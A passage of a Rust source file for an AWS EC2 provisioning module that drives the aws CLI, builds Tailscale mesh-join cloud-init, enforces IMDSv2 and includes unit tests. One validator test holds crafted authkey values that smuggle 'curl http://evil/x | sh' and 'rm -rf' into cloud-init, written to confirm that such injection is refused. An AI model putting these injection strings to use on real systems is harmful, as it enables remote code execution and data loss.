//! [`Ec2Provider`] — the AWS EC2 scale-out provider (ARCHITECTURE.md ladder rung 4,
//! the named scale-out beyond the local path). There is deliberately **no Hetzner
//! provider**; AWS EC2 is the first concrete rentable-machine provider.
//!
//! ## How it talks to AWS
//!
//! Every AWS operation goes through one seam — the [`AwsCli`] trait (`run(argv) ->
//! JSON`). The production backend ([`SystemAwsCli`], the default) shells out to the
//! `aws` CLI (`tokio::process::Command`) rather than linking the heavy
//! `aws-sdk-ec2` crate, and parses the CLI's JSON output with `serde_json`. Routing
//! the wire through a trait lets the whole provider lifecycle be exercised against a
//! mock (no AWS account, no creds, no `aws` binary). Each lifecycle operation maps
//! to one AWS call:
//!
//! - [`provision`](VmProvider::provision) → `aws ec2 run-instances` (small
//!   `t3.*` instance, the AMI/region/tags, the security group, and the overlay-join
//!   user-data), then polls `describe-instance-status` until the instance reports
//!   `running`.
//! - [`terminate`](VmProvider::terminate) → `aws ec2 terminate-instances`.
//! - [`list`](VmProvider::list) → `aws ec2 describe-instances` (scoped to the owner tag).
//! - [`status`](VmProvider::status) → `aws ec2 describe-instance-status`.
//!
//! ## What is real vs gated
//!
//! - **Real + always-tested:** the *exact* `aws ec2 …` argv each operation issues
//!   ([`Ec2Provider::run_instances_argv`] etc.), the JSON-response parsing
//!   ([`Ec2Provider::parse_machines`], [`parse_instance_id`], [`parse_status`]), and
//!   the *full provision → poll-running → list / status → terminate lifecycle* —
//!   the last proven against a mock [`AwsCli`] that simulates the instance state
//!   machine, no AWS account required.
//! - **Real but cost-gated:** the live wire ([`SystemAwsCli`] actually calling
//!   `aws`). A `run-instances` costs money and needs creds, so the end-to-end test
//!   is `#[ignore]` and only runs under `DREGGNET_EC2_LIVE=1`.
//! - **Mesh-wired:** [`run_lease`](VmProvider::run_lease) reaches the instance over the
//!   secure plane ([`crate::mesh`]). A real fleet is built with [`Ec2Provider::for_fleet`],
//!   which attaches the **real overlay mesh** ([`crate::TailscaleMesh`], the proven
//!   edge→persvati `:8021/fulfill` path) as the configured default; `Ec2Provider::new`
//!   stays mesh-less so unit tests attach a [`crate::StubMesh`] explicitly. With a mesh
//!   and the worker's mesh identity registered ([`Ec2Provider::register_mesh_node`]) it
//!   establishes a [`MeshLink`](crate::MeshLink), health-checks the node, and dispatches
//!   the workload to its bridge agent over the link.

use std::sync::Arc;

use async_trait::async_trait;
use dreggnet_bridge::{DurableOutput, Lease};
use serde_json::Value;

use crate::mesh::{Mesh, MeshNode, MeshNodeRegistry, dispatch_lease_over_mesh};
use crate::provider::{
    Machine, MachineId, MachineSize, MachineSpec, MachineStatus, ProviderError, VmProvider,
};
use dreggnet_exec::CapTier;

/// Max `describe-instance-status` polls while waiting for a freshly-provisioned
/// instance to reach `running`, and the back-off between them.
const PROVISION_POLL_ATTEMPTS: u32 = 60;
const PROVISION_POLL_INTERVAL: std::time::Duration = std::time::Duration::from_secs(3);

/// The AWS control-plane wire the provider issues its EC2 operations over,
/// abstracted behind a seam: `run(argv) -> parsed JSON`. The production backend
/// ([`SystemAwsCli`], the default) shells out to the `aws` CLI; a test supplies a
/// mock that simulates the instance state machine, so the whole
/// provision→poll-running→list/status→terminate lifecycle can be proven with no
/// AWS account, no credentials, and no `aws` binary on the host.
#[async_trait]
pub trait AwsCli: Send + Sync {
    /// Run an `aws …` argv (as built by [`Ec2Provider::run_instances_argv`] etc.)
    /// to completion and return its response parsed as JSON. A spawn failure, a
    /// non-zero exit, or unparseable output surface as [`ProviderError::Aws`].
    async fn run(&self, argv: Vec<String>) -> Result<Value, ProviderError>;

    /// A short identifier for this backend (`"aws-cli"`, `"mock"`), for Debug.
    fn kind(&self) -> &'static str {
        "aws-cli"
    }
}

/// The production [`AwsCli`]: shell out to the `aws` CLI and parse its JSON stdout.
/// `--output json` is appended so the parse is robust regardless of the caller's
/// configured default output format.
#[derive(Debug, Default, Clone)]
pub struct SystemAwsCli;

#[async_trait]
impl AwsCli for SystemAwsCli {
    async fn run(&self, mut argv: Vec<String>) -> Result<Value, ProviderError> {
        argv.push("--output".into());
        argv.push("json".into());
        let rendered = argv.join(" ");
        let output = tokio::process::Command::new(&argv[0])
            .args(&argv[1..])
            .output()
            .await
            .map_err(|e| ProviderError::Aws(format!("spawning `{rendered}`: {e}")))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let stderr = stderr.trim();
            // A missing instance id is a NotFound, not an infrastructure error.
            return Err(if stderr.contains("InvalidInstanceID.NotFound") {
                ProviderError::Aws(format!("`{rendered}`: instance not found ({stderr})"))
            } else {
                ProviderError::Aws(format!("`{rendered}` failed: {stderr}"))
            });
        }
        serde_json::from_slice(&output.stdout)
            .map_err(|e| ProviderError::Aws(format!("parsing output of `{rendered}`: {e}")))
    }
}

/// Configuration for the AWS EC2 provider: the AMI to boot (a DreggNet worker image
/// carrying the bridge + the owned sandbox) and a tag used to scope `list`/reaping to machines
/// this control plane owns.
#[derive(Clone)]
pub struct Ec2Provider {
    /// The AMI id the worker image is published as (the DreggNet bridge+the owned sandbox image).
    pub ami_id: String,
    /// The tag key/value stamped on every instance this provider rents, so `list`
    /// only returns machines this control plane owns.
    pub owner_tag: (String, String),
    /// The EC2 key pair name for SSH access to provisioned instances (optional).
    pub key_name: Option<String>,
    /// The security groups every provisioned instance joins (`--security-group-ids`).
    /// These gate the instance's ingress to the overlay/mesh ports only.
    pub security_groups: Vec<String>,
    /// The launch user-data (cloud-init) every instance boots with. The real fleet
    /// sets this to the overlay-join script ([`Ec2Provider::overlay_join_user_data`])
    /// so the worker comes up on the mesh and registers its identity on boot.
    pub user_data: Option<String>,
    /// The AWS control-plane wire (the seam). Defaults to [`SystemAwsCli`] (the
    /// real `aws` CLI); a test swaps in a mock with [`Ec2Provider::with_aws_cli`].
    cli: Arc<dyn AwsCli>,
    /// The secure plane this provider reaches a provisioned instance over. `None`
    /// (the [`Ec2Provider::new`] default) means no mesh is configured and a workload
    /// cannot be dispatched to a remote instance yet; a real fleet built with
    /// [`Ec2Provider::for_fleet`] attaches the real overlay mesh.
    mesh: Option<Arc<dyn Mesh>>,
    /// The mesh identities workers registered on boot, keyed by machine. The
    /// control plane consults this to learn how to reach a machine over the mesh.
    nodes: Arc<MeshNodeRegistry>,
}

impl std::fmt::Debug for Ec2Provider {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("Ec2Provider")
            .field("ami_id", &self.ami_id)
            .field("owner_tag", &self.owner_tag)
            .field("key_name", &self.key_name)
            .field("security_groups", &self.security_groups)
            .field("aws", &self.cli.kind())
            .field("mesh", &self.mesh.as_ref().map(|m| m.backend()))
            .finish()
    }
}

impl Ec2Provider {
    /// A provider that boots `ami_id`, tagging every instance `dreggnet=<owner>`.
    /// Mesh-less by default (unit tests attach a [`crate::StubMesh`]); use
    /// [`Ec2Provider::for_fleet`] to build one wired to the real overlay mesh.
    pub fn new(ami_id: impl Into<String>, owner: impl Into<String>) -> Ec2Provider {
        Ec2Provider {
            ami_id: ami_id.into(),
            owner_tag: ("dreggnet".to_string(), owner.into()),
            key_name: None,
            security_groups: Vec::new(),
            user_data: None,
            cli: Arc::new(SystemAwsCli),
            mesh: None,
            nodes: Arc::new(MeshNodeRegistry::new()),
        }
    }

    /// Build an EC2 provider for a **real fleet**: the AMI/owner, an optional
    /// security group, and the real overlay mesh ([`crate::TailscaleMesh`], the
    /// proven edge→persvati `:8021/fulfill` path) attached as the dispatch plane.
    /// This is the configured default a real fleet runs with — [`Ec2Provider::new`]
    /// stays mesh-less so unit tests attach a [`crate::StubMesh`] explicitly.
    pub fn for_fleet(
        ami_id: impl Into<String>,
        owner: impl Into<String>,
        security_group: Option<String>,
    ) -> Ec2Provider {
        let mut p = Ec2Provider::new(ami_id, owner);
        if let Some(sg) = security_group {
            p.security_groups.push(sg);
        }
        p.with_mesh(Arc::new(crate::mesh::TailscaleMesh::new()))
    }

    /// Swap the AWS control-plane wire (the [`AwsCli`] seam). Used by tests to drive
    /// the lifecycle against a mock; production uses the [`SystemAwsCli`] default.
    pub fn with_aws_cli(mut self, cli: Arc<dyn AwsCli>) -> Ec2Provider {
        self.cli = cli;
        self
    }

    /// Add a security group every provisioned instance joins (`--security-group-ids`).
    pub fn with_security_group(mut self, group: impl Into<String>) -> Ec2Provider {
        self.security_groups.push(group.into());
        self
    }

    /// Set the launch user-data (cloud-init) every instance boots with — typically
    /// [`Ec2Provider::overlay_join_user_data`] so the worker joins the mesh on boot.
    pub fn with_user_data(mut self, user_data: impl Into<String>) -> Ec2Provider {
        self.user_data = Some(user_data.into());
        self
    }

    /// The backend name of the attached mesh (`"tailscale"`, `"stub"`, …), or `None`
    /// when no mesh is configured (a [`Ec2Provider::new`] provider).
    pub fn mesh_backend(&self) -> Option<&'static str> {
        self.mesh.as_ref().map(|m| m.backend())
    }

    /// A minimal cloud-init `user-data` script that joins the host to the tailnet
    /// overlay on boot and starts the bridge agent on `agent_port`. `authkey` is the
    /// tailnet/headscale pre-auth key the worker enrolls with. This is what makes a
    /// freshly-launched instance reachable over the mesh (so it can register its
    /// identity and accept dispatched workloads) without an inbound public port.
    ///
    /// `authkey` is validated (8.4): a newline / carriage-return / control character in
    /// the key would let a crafted key inject extra `runcmd:` lines into the cloud-init
    /// document (command injection on every booted worker), so such a key is refused.
    ///
    /// SECURITY NOTE (8.3, the out-of-band delivery this is queued behind): user-data is
    /// readable by any workload on the instance via IMDS, so a plaintext authkey here is
    /// recoverable by the instance's own workload. Launches now *enforce IMDSv2*
    /// (`HttpTokens=required`, `HttpPutResponseHopLimit=1`; see
    /// [`Ec2Provider::metadata_options_arg`]) which blocks the SSRF-style cross-container
    /// IMDS read; the overlay-join path is also only test-wired today. The durable fix
    /// (tracked for the overlay-join wiring) is to deliver an *ephemeral, single-use,
    /// short-TTL* authkey out-of-band (mesh-issued at first contact) rather than baking a
    /// reusable key into user-data at all.
    pub fn overlay_join_user_data(authkey: &str, agent_port: u16) -> Result<String, ProviderError> {
        if authkey.is_empty() {
            return Err(ProviderError::Aws("overlay-join authkey is empty".into()));
        }
        if authkey.chars().any(|c| c.is_control()) {
            return Err(ProviderError::Aws(
                "overlay-join authkey contains a control/newline character — refused (would \
                 inject extra cloud-init runcmd lines)"
                    .into(),
            ));
        }
        Ok(format!(
            "#cloud-config\n\
             runcmd:\n\
             \x20 - tailscale up --authkey={authkey} --hostname=dreggnet-worker\n\
             \x20 - dreggnet-bridge-agent --listen 0.0.0.0:{agent_port}\n"
        ))
    }

    /// The `--metadata-options` argument that enforces IMDSv2 on every launched instance
    /// (8.3): `HttpTokens=required` makes the metadata service reject token-less (IMDSv1)
    /// reads, and `HttpPutResponseHopLimit=1` keeps the metadata response from being
    /// proxied off-host. This is what stops an instance workload (or an SSRF in it) from
    /// trivially recovering the launch user-data (e.g. the mesh-join key).
    pub fn metadata_options_arg() -> String {
        "HttpTokens=required,HttpEndpoint=enabled,HttpPutResponseHopLimit=1".to_string()
    }

    /// Attach the secure mesh this provider reaches provisioned instances over.
    /// With a mesh configured, [`run_lease`](VmProvider::run_lease) dispatches the
    /// workload to the instance's bridge agent over its [`MeshLink`](crate::MeshLink)
    /// instead of reporting an unwired stub.
    pub fn with_mesh(mut self, mesh: Arc<dyn Mesh>) -> Ec2Provider {
        self.mesh = Some(mesh);
        self
    }

    /// Record the mesh identity a worker registered for its machine on boot (its
    /// WireGuard public key + endpoint + overlay address). The control plane needs
    /// this to reach the machine over the mesh; a freshly-`run-instances`d box has
    /// none until its worker comes up and registers (the deploy step).
    pub fn register_mesh_node(&self, node: MeshNode) -> std::io::Result<()> {
        self.nodes.register(node)
    }

    /// The `aws ec2 run-instances` argv that provisions one machine to `spec`.
    pub fn run_instances_argv(&self, spec: &MachineSpec) -> Vec<String> {
        let (tag_k, tag_v) = &self.owner_tag;
        let mut argv = vec![
            "aws".into(),
            "ec2".into(),
            "run-instances".into(),
            "--image-id".into(),
            self.ami_id.clone(),
            "--instance-type".into(),
            spec.size.ec2_instance_type().to_string(),
            "--region".into(),
            spec.region.clone(),
            "--count".into(),
            "1".into(),
            "--tag-specifications".into(),
            format!(
                "ResourceType=instance,Tags=[{{Key={tag_k},Value={tag_v}}},{{Key=cap-tier,Value={:?}}}]",
                spec.cap_tier
            ),
            // Enforce IMDSv2 (8.3): token-required metadata + hop-limit 1, so an instance
            // workload / SSRF cannot trivially read the launch user-data (the mesh key).
            "--metadata-options".into(),
            Ec2Provider::metadata_options_arg(),
        ];
        if let Some(key) = &self.key_name {
            argv.push("--key-name".into());
            argv.push(key.clone());
        }
        if !self.security_groups.is_empty() {
            argv.push("--security-group-ids".into());
            for sg in &self.security_groups {
                argv.push(sg.clone());
            }
        }
        if let Some(user_data) = &self.user_data {
            // The `aws` CLI base64-encodes a plain `--user-data` string for us.
            argv.push("--user-data".into());
            argv.push(user_data.clone());
        }
        argv
    }

    /// The `aws ec2 terminate-instances` argv that releases one machine.
    pub fn terminate_instances_argv(&self, id: &MachineId) -> Vec<String> {
        vec![
            "aws".into(),
            "ec2".into(),
            "terminate-instances".into(),
            "--instance-ids".into(),
            id.0.clone(),
        ]
    }

    /// The `aws ec2 describe-instances` argv that lists this provider's machines
    /// (scoped to the owner tag).
    pub fn describe_instances_argv(&self) -> Vec<String> {
        let (tag_k, tag_v) = &self.owner_tag;
        vec![
            "aws".into(),
            "ec2".into(),
            "describe-instances".into(),
            "--filters".into(),
            format!("Name=tag:{tag_k},Values={tag_v}"),
        ]
    }

    /// The `aws ec2 describe-instance-status` argv that queries one machine's status.
    /// `--include-all-instances` is passed so non-`running` states (pending, stopping,
    /// terminated) are reported too — without it AWS only returns running instances,
    /// and a just-launched or torn-down machine would look absent.
    pub fn describe_instance_status_argv(&self, id: &MachineId) -> Vec<String> {
        vec![
            "aws".into(),
            "ec2".into(),
            "describe-instance-status".into(),
            "--include-all-instances".into(),
            "--instance-ids".into(),
            id.0.clone(),
        ]
    }

    /// Issue an `aws …` argv over the configured [`AwsCli`] wire and return its
    /// parsed JSON response (the real `aws` CLI in production, a mock in tests).
    async fn run_aws(&self, argv: Vec<String>) -> Result<Value, ProviderError> {
        self.cli.run(argv).await
    }

    /// Reconstruct the machines in a `describe-instances` JSON response, rebuilding each
    /// [`MachineSpec`] from the instance type, the `cap-tier` tag, and the placement AZ.
    pub fn parse_machines(&self, json: &Value) -> Vec<Machine> {
        let mut machines = Vec::new();
        let reservations = json.get("Reservations").and_then(Value::as_array);
        for reservation in reservations.into_iter().flatten() {
            let instances = reservation.get("Instances").and_then(Value::as_array);
            for inst in instances.into_iter().flatten() {
                let Some(id) = inst.get("InstanceId").and_then(Value::as_str) else {
                    continue;
                };
                let state = inst
                    .get("State")
                    .and_then(|s| s.get("Name"))
                    .and_then(Value::as_str)
                    .unwrap_or_default();
                let size = inst
                    .get("InstanceType")
                    .and_then(Value::as_str)
                    .and_then(MachineSize::from_ec2_instance_type)
                    .unwrap_or(MachineSize::Small);
                let region = inst
                    .get("Placement")
                    .and_then(|p| p.get("AvailabilityZone"))
                    .and_then(Value::as_str)
                    .map(az_to_region)
                    .unwrap_or_default();
                let cap_tier = cap_tier_from_tags(inst).unwrap_or(CapTier::Sandboxed);
                machines.push(Machine {
                    id: MachineId(id.to_string()),
                    spec: MachineSpec {
                        cap_tier,
                        size,
                        region,
                    },
                    status: status_from_state_name(state),
                    provider: "aws-ec2",
                });
            }
        }
        machines
    }

    /// Poll `describe-instance-status` until `id` reports `running`, backing off
    /// between attempts. Returns the reached [`MachineStatus`], or a timeout error.
    async fn poll_until_running(&self, id: &MachineId) -> Result<MachineStatus, ProviderError> {
        for _ in 0..PROVISION_POLL_ATTEMPTS {
            match self.status(id).await {
                Ok(MachineStatus::Running) => return Ok(MachineStatus::Running),
                Ok(MachineStatus::Terminated) => {
                    return Err(ProviderError::Aws(format!(
                        "instance {id} terminated before reaching running"
                    )));
                }
                // Provisioning, or not yet visible — keep waiting.
                Ok(MachineStatus::Provisioning) | Err(ProviderError::NotFound(_)) => {}
                Err(other) => return Err(other),
            }
            tokio::time::sleep(PROVISION_POLL_INTERVAL).await;
        }
        Err(ProviderError::Aws(format!(
            "instance {id} did not reach running within {PROVISION_POLL_ATTEMPTS} polls"
        )))
    }
}

/// Map an AWS instance-state name to our coarse [`MachineStatus`]. `pending` is still
/// coming up; `running` is live; every terminal/stopped state is no-longer-billable.
fn status_from_state_name(name: &str) -> MachineStatus {
    match name {
        "pending" => MachineStatus::Provisioning,
        "running" => MachineStatus::Running,
        // shutting-down | terminated | stopping | stopped | anything else.
        _ => MachineStatus::Terminated,
    }
}

/// Trim the AZ suffix off an availability zone to recover the region
/// (`us-east-1a` → `us-east-1`).
fn az_to_region(az: &str) -> String {
    az.trim_end_matches(|c: char| c.is_ascii_alphabetic())
        .to_string()
}

/// The [`CapTier`] a tag value names, matching the `{cap_tier:?}` Debug rendering
/// stamped by [`Ec2Provider::run_instances_argv`].
fn cap_tier_from_str(value: &str) -> Option<CapTier> {
    match value {
        "Sandboxed" => Some(CapTier::Sandboxed),
        "JitSandboxed" => Some(CapTier::JitSandboxed),
        "Caged" => Some(CapTier::Caged),
        "MicroVm" => Some(CapTier::MicroVm),
        _ => None,
    }
}

/// The cap-tier an instance was tagged with, if present.
fn cap_tier_from_tags(inst: &Value) -> Option<CapTier> {
    let tags = inst.get("Tags").and_then(Value::as_array)?;
    tags.iter()
        .find(|t| t.get("Key").and_then(Value::as_str) == Some("cap-tier"))
        .and_then(|t| t.get("Value").and_then(Value::as_str))
        .and_then(cap_tier_from_str)
}

/// The first instance id in a `run-instances` JSON response.
pub fn parse_instance_id(json: &Value) -> Result<String, ProviderError> {
    json.get("Instances")
        .and_then(Value::as_array)
        .and_then(|a| a.first())
        .and_then(|i| i.get("InstanceId"))
        .and_then(Value::as_str)
        .map(str::to_string)
        .ok_or_else(|| ProviderError::Aws("run-instances response had no InstanceId".into()))
}

/// The [`MachineStatus`] in a `describe-instance-status` JSON response, or `None`
/// if the response carried no instance (an unknown id).
pub fn parse_status(json: &Value) -> Option<MachineStatus> {
    json.get("InstanceStatuses")
        .and_then(Value::as_array)
        .and_then(|a| a.first())
        .and_then(|s| s.get("InstanceState"))
        .and_then(|st| st.get("Name"))
        .and_then(Value::as_str)
        .map(status_from_state_name)
}

#[async_trait]
impl VmProvider for Ec2Provider {
    fn name(&self) -> &'static str {
        "aws-ec2"
    }

    async fn provision(&self, spec: MachineSpec) -> Result<Machine, ProviderError> {
        // Launch the instance, read back its `i-…` id, then wait for it to come up.
        let json = self.run_aws(self.run_instances_argv(&spec)).await?;
        let id = MachineId(parse_instance_id(&json)?);
        let status = self.poll_until_running(&id).await?;
        Ok(Machine {
            id,
            spec,
            status,
            provider: "aws-ec2",
        })
    }

    async fn terminate(&self, id: &MachineId) -> Result<(), ProviderError> {
        // The terminate-instances response (TerminatingInstances) is just an ack.
        self.run_aws(self.terminate_instances_argv(id)).await?;
        Ok(())
    }

    async fn list(&self) -> Result<Vec<Machine>, ProviderError> {
        let json = self.run_aws(self.describe_instances_argv()).await?;
        Ok(self.parse_machines(&json))
    }

    async fn status(&self, id: &MachineId) -> Result<MachineStatus, ProviderError> {
        let json = self.run_aws(self.describe_instance_status_argv(id)).await?;
        parse_status(&json).ok_or_else(|| ProviderError::NotFound(id.clone()))
    }

    async fn run_lease(
        &self,
        machine: &Machine,
        lease: &Lease,
        instance: &str,
    ) -> Result<DurableOutput, ProviderError> {
        // Reach the provisioned instance over the secure mesh and dispatch the
        // workload to its bridge agent. This needs (1) a configured mesh and (2)
        // the worker to have registered its mesh identity on boot.
        match (&self.mesh, self.nodes.get(&machine.id)) {
            (Some(mesh), Some(node)) => {
                // The control-uses-mesh path: connect, health-check, dispatch. The
                // connect + health-check are real over the link; streaming the
                // workflow to the live remote bridge agent is the deploy step.
                dispatch_lease_over_mesh(mesh.as_ref(), &node, lease, instance).await
            }
            (Some(_), None) => Err(ProviderError::Bridge(format!(
                "machine {} has not registered a mesh identity yet — its worker registers \
                 its WireGuard pubkey+endpoint on boot (register_mesh_node); the live \
                 registration is the deploy step",
                machine.id
            ))),
            (None, _) => Err(ProviderError::Unimplemented {
                provider: "aws-ec2",
                would_run: "configure a mesh (Ec2Provider::with_mesh) to dispatch the workload \
                            to the instance's bridge agent over the net/ wireguard mesh"
                    .into(),
            }),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::provider::MachineSize;
    use dreggnet_exec::CapTier;

    fn ec2() -> Ec2Provider {
        Ec2Provider::new("ami-0dregg", "prod")
    }

    fn spec() -> MachineSpec {
        MachineSpec::new(CapTier::Caged, MachineSize::Medium, "us-east-1")
    }

    #[test]
    fn run_instances_argv_has_the_expected_shape() {
        let argv = ec2().run_instances_argv(&spec());
        assert_eq!(argv[0], "aws");
        assert_eq!(argv[1], "ec2");
        assert_eq!(argv[2], "run-instances");
        // The AMI, the size→instance-type mapping, and the region are all present.
        assert!(argv.contains(&"ami-0dregg".to_string()));
        assert!(argv.contains(&"t3.medium".to_string()));
        assert!(argv.contains(&"us-east-1".to_string()));
        // The owner tag scopes the instance to this control plane.
        let joined = argv.join(" ");
        assert!(joined.contains("Key=dreggnet,Value=prod"));
        assert!(joined.contains("Key=cap-tier,Value=Caged"));
    }

    #[test]
    fn terminate_argv_targets_the_instance() {
        let id = MachineId("i-0abc123".into());
        let argv = ec2().terminate_instances_argv(&id);
        assert_eq!(
            argv,
            vec![
                "aws",
                "ec2",
                "terminate-instances",
                "--instance-ids",
                "i-0abc123",
            ]
        );
    }

    #[test]
    fn describe_instance_status_argv_includes_all_states() {
        let argv = ec2().describe_instance_status_argv(&MachineId("i-0abc123".into()));
        let joined = argv.join(" ");
        assert!(joined.starts_with("aws ec2 describe-instance-status"));
        // Without this flag AWS hides pending/terminated instances.
        assert!(argv.contains(&"--include-all-instances".to_string()));
        assert!(argv.contains(&"i-0abc123".to_string()));
    }

    #[test]
    fn parse_instance_id_reads_run_instances_output() {
        // Trimmed shape of a real `aws ec2 run-instances --output json` response.
        let json: Value = serde_json::from_str(
            r#"{ "Instances": [ { "InstanceId": "i-0abc123def456", "State": { "Name": "pending" } } ] }"#,
        )
        .unwrap();
        assert_eq!(parse_instance_id(&json).unwrap(), "i-0abc123def456");

        // A response missing the id is an Aws error, not a panic.
        let empty: Value = serde_json::from_str(r#"{ "Instances": [] }"#).unwrap();
        assert!(matches!(
            parse_instance_id(&empty),
            Err(ProviderError::Aws(_))
        ));
    }

    #[test]
    fn parse_status_maps_aws_states() {
        let running: Value = serde_json::from_str(
            r#"{ "InstanceStatuses": [ { "InstanceState": { "Code": 16, "Name": "running" } } ] }"#,
        )
        .unwrap();
        assert_eq!(parse_status(&running), Some(MachineStatus::Running));

        let pending: Value = serde_json::from_str(
            r#"{ "InstanceStatuses": [ { "InstanceState": { "Name": "pending" } } ] }"#,
        )
        .unwrap();
        assert_eq!(parse_status(&pending), Some(MachineStatus::Provisioning));

        let terminated: Value = serde_json::from_str(
            r#"{ "InstanceStatuses": [ { "InstanceState": { "Name": "terminated" } } ] }"#,
        )
        .unwrap();
        assert_eq!(parse_status(&terminated), Some(MachineStatus::Terminated));

        // No instance in the response → unknown id.
        let empty: Value = serde_json::from_str(r#"{ "InstanceStatuses": [] }"#).unwrap();
        assert_eq!(parse_status(&empty), None);
    }

    #[test]
    fn parse_machines_rebuilds_specs_from_describe_instances() {
        // Trimmed shape of a real `aws ec2 describe-instances --output json` response,
        // with two reservations carrying one instance each.
        let json: Value = serde_json::from_str(
            r#"{
              "Reservations": [
                {
                  "Instances": [
                    {
                      "InstanceId": "i-aaa",
                      "InstanceType": "t3.medium",
                      "State": { "Name": "running" },
                      "Placement": { "AvailabilityZone": "us-east-1a" },
                      "Tags": [
                        { "Key": "dreggnet", "Value": "prod" },
                        { "Key": "cap-tier", "Value": "Caged" }
                      ]
                    }
                  ]
                },
                {
                  "Instances": [
                    {
                      "InstanceId": "i-bbb",
                      "InstanceType": "t3.small",
                      "State": { "Name": "pending" },
                      "Placement": { "AvailabilityZone": "eu-west-2b" },
                      "Tags": [ { "Key": "cap-tier", "Value": "Sandboxed" } ]
                    }
                  ]
                }
              ]
            }"#,
        )
        .unwrap();

        let machines = ec2().parse_machines(&json);
        assert_eq!(machines.len(), 2);

        let a = &machines[0];
        assert_eq!(a.id, MachineId("i-aaa".into()));
        assert_eq!(a.provider, "aws-ec2");
        assert_eq!(a.status, MachineStatus::Running);
        assert_eq!(a.spec.size, MachineSize::Medium);
        assert_eq!(a.spec.region, "us-east-1");
        assert_eq!(a.spec.cap_tier, CapTier::Caged);

        let b = &machines[1];
        assert_eq!(b.id, MachineId("i-bbb".into()));
        assert_eq!(b.status, MachineStatus::Provisioning);
        assert_eq!(b.spec.size, MachineSize::Small);
        assert_eq!(b.spec.region, "eu-west-2");
        assert_eq!(b.spec.cap_tier, CapTier::Sandboxed);
    }

    #[test]
    fn empty_describe_instances_is_no_machines() {
        let json: Value = serde_json::from_str(r#"{ "Reservations": [] }"#).unwrap();
        assert!(ec2().parse_machines(&json).is_empty());
    }

    /// Without a mesh attached, `run_lease` reports it needs one — no remote
    /// instance can be reached.
    #[tokio::test]
    async fn run_lease_without_a_mesh_reports_the_missing_plane() {
        let m = Machine {
            id: MachineId("i-nomesh".into()),
            spec: spec(),
            status: MachineStatus::Running,
            provider: "aws-ec2",
        };
        let lease = Lease::funded("a", dreggnet_bridge::CapGrade::Caged, "USD", 100, 1);
        assert!(matches!(
            ec2().run_lease(&m, &lease, "i-nomesh").await,
            Err(ProviderError::Unimplemented {
                provider: "aws-ec2",
                ..
            })
        ));
    }

    /// With a mesh attached but the machine's worker not yet registered, the
    /// provider says so (the live registration is the deploy step).
    #[tokio::test]
    async fn run_lease_with_mesh_but_unregistered_machine() {
        use crate::mesh::StubMesh;
        let p = ec2().with_mesh(std::sync::Arc::new(StubMesh::reachable()));
        let m = Machine {
            id: MachineId("i-unreg".into()),
            spec: spec(),
            status: MachineStatus::Running,
            provider: "aws-ec2",
        };
        let lease = Lease::funded("a", dreggnet_bridge::CapGrade::Caged, "USD", 100, 1);
        assert!(matches!(
            p.run_lease(&m, &lease, "i-unreg").await,
            Err(ProviderError::Bridge(_))
        ));
    }

    /// The full control-uses-mesh path: mesh attached + worker registered →
    /// `run_lease` establishes a link to the instance, health-checks it, and
    /// dispatches over the link (the remote stream itself is the deploy step).
    #[tokio::test]
    async fn run_lease_reaches_a_registered_machine_over_the_mesh() {
        use crate::mesh::{MeshKeypair, MeshNode, StubMesh};
        use std::net::Ipv4Addr;

        let p = ec2().with_mesh(std::sync::Arc::new(StubMesh::reachable()));
        let m = Machine {
            id: MachineId("i-fleet".into()),
            spec: spec(),
            status: MachineStatus::Running,
            provider: "aws-ec2",
        };
        // The worker registers its mesh identity on boot.
        p.register_mesh_node(MeshNode::new(
            m.id.clone(),
            MeshKeypair::generate().public_base64(),
            "203.0.113.9:51820",
            Ipv4Addr::new(100, 64, 0, 5),
        ))
        .unwrap();

        let lease = Lease::funded("a", dreggnet_bridge::CapGrade::Caged, "USD", 100, 1);
        match p.run_lease(&m, &lease, "i-fleet").await {
            Err(ProviderError::Unimplemented {
                provider: "mesh",
                would_run,
            }) => {
                // It reached the node's overlay address over the established link.
                assert!(would_run.contains("100.64.0.5:8021"));
                assert!(would_run.contains("stub mesh link"));
            }
            other => panic!("expected a dispatch-over-mesh plan, got {other:?}"),
        }
    }

    #[test]
    fn run_instances_argv_carries_the_security_group_and_overlay_join() {
        let p = ec2()
            .with_security_group("sg-0fleet")
            .with_user_data(Ec2Provider::overlay_join_user_data("tskey-abc", 8021).unwrap());
        let argv = p.run_instances_argv(&spec());
        let joined = argv.join(" ");
        // The instance joins the fleet's security group…
        assert!(argv.contains(&"--security-group-ids".to_string()));
        assert!(argv.contains(&"sg-0fleet".to_string()));
        // …and boots with the overlay-join cloud-init that brings it up on the mesh.
        assert!(argv.contains(&"--user-data".to_string()));
        assert!(joined.contains("tailscale up --authkey=tskey-abc"));
        assert!(joined.contains("dreggnet-bridge-agent --listen 0.0.0.0:8021"));
    }

    /// 8.3: every launch enforces IMDSv2 — token-required metadata, hop-limit 1 — so an
    /// instance workload can't trivially read the launch user-data.
    #[test]
    fn run_instances_argv_enforces_imdsv2() {
        let argv = ec2().run_instances_argv(&spec());
        assert!(argv.contains(&"--metadata-options".to_string()));
        let joined = argv.join(" ");
        assert!(
            joined.contains("HttpTokens=required"),
            "IMDSv2 token must be required: {joined}"
        );
        assert!(
            joined.contains("HttpPutResponseHopLimit=1"),
            "hop limit must be 1: {joined}"
        );
    }

    /// 8.4: an authkey carrying a newline (cloud-init runcmd injection) is refused; a clean
    /// key is accepted.
    #[test]
    fn overlay_join_rejects_newline_authkey() {
        // A crafted key that would inject an extra runcmd line.
        let evil = "tskey-abc\n - curl http://evil/x | sh";
        assert!(Ec2Provider::overlay_join_user_data(evil, 8021).is_err());
        assert!(Ec2Provider::overlay_join_user_data("tskey-abc\r\nrm -rf", 8021).is_err());
        assert!(Ec2Provider::overlay_join_user_data("", 8021).is_err());
        // A clean key still works.
        assert!(Ec2Provider::overlay_join_user_data("tskey-clean", 8021).is_ok());
    }

    /// A mock [`AwsCli`] that simulates the EC2 instance state machine in-memory, so
    /// the provider's full lifecycle is provable with no AWS account / creds / binary.
    /// `run-instances` mints a fresh `i-…` running instance (reconstructing its type /
    /// AZ / cap-tier from the argv); `describe-instance-status` reports its state;
    /// `describe-instances` lists the held set; `terminate-instances` flips it to
    /// terminated and acks.
    #[derive(Clone, Default)]
    struct MockAwsCli {
        inner: Arc<std::sync::Mutex<MockState>>,
    }

    #[derive(Default)]
    struct MockState {
        next: u32,
        instances: Vec<MockInstance>,
